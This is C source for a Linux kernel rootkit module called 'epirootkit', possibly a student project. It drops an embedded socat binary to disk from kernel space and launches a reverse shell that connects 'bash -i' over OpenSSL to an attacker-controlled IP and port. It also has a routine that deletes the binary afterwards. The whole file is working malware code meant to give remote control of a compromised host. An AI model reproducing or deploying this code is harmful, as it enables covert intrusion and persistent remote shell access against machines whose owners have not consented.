#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/file.h>
#include <linux/err.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/sched.h>   // Pour les structures de processus
#include <linux/completion.h>  // Pour attendre la fin du processus
#include <linux/kthread.h>

#include "epirootkit.h"
#include "socat.h"

int is_socat_binaire_dropped(void);
int drop_socat_binaire(void);
int launch_reverse_shell(void);

int is_socat_binaire_dropped(void){
	struct file *f;
	f = filp_open(SOCAT_BINARY_PATH, O_RDONLY, 0);
	if (IS_ERR(f))
		return false;
	filp_close(f, NULL);
	return true;
}

int drop_socat_binaire(void){
	if(is_socat_binaire_dropped()) {
		DBG_MSG("drop_socat_binaire: socat binary already dropped\n");
		return SUCCESS;
	}

    struct file *f;
    loff_t pos = 0;

    f = filp_open(SOCAT_BINARY_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0700);
    if (IS_ERR(f)) {
        ERR_MSG("drop_socat_binaire: failed to open file: %ld\n", PTR_ERR(f));
        return -FAILURE;
    }

    unsigned int written = kernel_write(f, socat, socat_len, &pos);
    if (written < 0) {
        ERR_MSG("drop_socat_binaire: kernel_write failed: %u\n", written);
		filp_close(f, NULL);
		return -FAILURE;
	} else if (written < socat_len) {
		ERR_MSG("drop_socat_binaire: only %u bytes written, expected %u\n", written, socat_len);
		filp_close(f, NULL);
		return -FAILURE;
    } else {
        DBG_MSG("socat written successfully (%u bytes)\n", written);
    }

    filp_close(f, NULL);

	return SUCCESS;
}

int remove_socat_binaire(void){
	exec_str_as_command("rm -f " SOCAT_BINARY_PATH, false);
	if (is_socat_binaire_dropped()) {
		ERR_MSG("remove_socat_binaire: failed to remove socat binary\n");
		return -FAILURE;
	}
	DBG_MSG("remove_socat_binaire: socat binary removed successfully\n");
	return SUCCESS;
}

int launch_reverse_shell(void){
	if (!is_socat_binaire_dropped()) {
		ERR_MSG("launch_reverse_shell: socat binary not dropped\n");
		return -FAILURE;
	}

	// launch socat in a userland managed thread
	char cmd[256];
	snprintf(cmd, 256, "%s exec:'bash -i',pty,stderr,setsid,sigint,sane openssl-connect:%s:%d,verify=0 &", SOCAT_BINARY_PATH, ip, REVERSE_SHELL_PORT);
	int ret = exec_str_as_command(cmd, false);
	if (ret == SUCCESS)
		DBG_MSG("launch_reverse_shell: socat reverse shell launched\n");
	else
		ERR_MSG("launch_reverse_shell: failed to start socat reverse shell\n");

	return ret;
}